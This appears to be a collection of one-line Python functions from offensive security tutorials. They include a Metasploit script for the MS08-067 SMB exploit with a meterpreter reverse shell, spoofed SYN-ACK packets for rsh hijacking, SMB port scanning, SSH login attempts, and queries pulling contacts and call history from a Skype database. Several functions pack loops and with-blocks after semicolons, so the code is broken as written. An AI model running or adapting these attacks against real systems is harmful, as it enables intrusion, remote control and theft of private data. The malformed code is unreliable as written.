def write_config_file(tgtHost, lport, lhost): config_lines = [f'use exploit/windows/smb/ms08_067_netapi\n', f'set RHOST {tgtHost}\n', f'set payload windows/meterpreter/reverse_tcp\n', f'set LPORT {lport}\n', f'set LHOST {lhost}\n', 'exploit -j -z\n']; with open('configFile', 'w') as f: f.writelines(config_lines)
def extract_ip_ttl(pkt): return pkt['IP'].src, pkt['IP'].ttl
def connect_ssx(): import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('ssx.protocol.address', 1234))
def get_html_via_proxy(url, proxy): import requests; proxies = {"http": proxy, "https": proxy}; response = requests.get(url, proxies=proxies); return response.text
def download_image(imgTag): import requests; img_url = imgTag['src']; img_data = requests.get(img_url).content; with open('downloaded_image.jpg', 'wb') as f: f.write(img_data); return 'downloaded_image.jpg'
def send_syn_ack(src, tgt, ack): from scapy.all import send, IP, TCP; send(IP(src=src, dst=tgt)/TCP(sport=513, dport=514, flags='SA', ack=ack))
def execute_skype_db_query1(): import sqlite3; conn = sqlite3.connect('skypeDB'); cursor = conn.cursor(); cursor.execute("SELECT fullname, skypename, city, country, datetime(profile_timestamp,'unixepoch') FROM Accounts"); result = cursor.fetchall(); conn.close(); return result
def scan_subnet_for_port_445(subnet): from scapy.all import sr1, IP, TCP; open_hosts = []; for i in range(1, 255): ip = f"{subnet}.{i}"; pkt = IP(dst=ip)/TCP(dport=445, flags='S'); response = sr1(pkt, timeout=1, verbose=False); if response and response.haslayer(TCP) and response[TCP].flags == 'SA': open_hosts.append(ip); return open_hosts
def ssh_connect_stop_on_failure(host, user, password): import paramiko; failures = 0; while failures < 3: try: ssh = paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()); ssh.connect(host, username=user, password=password); return "Connected"; except paramiko.AuthenticationException: failures += 1; return "Failed"
def execute_skype_db_query2(): import sqlite3; conn = sqlite3.connect('skypeDB'); cursor = conn.cursor(); cursor.execute("SELECT datetime(begin_timestamp,'unixepoch'), identity FROM calls, conversations WHERE calls.conv_dbid = conversations.id"); result = cursor.fetchall(); conn.close(); return result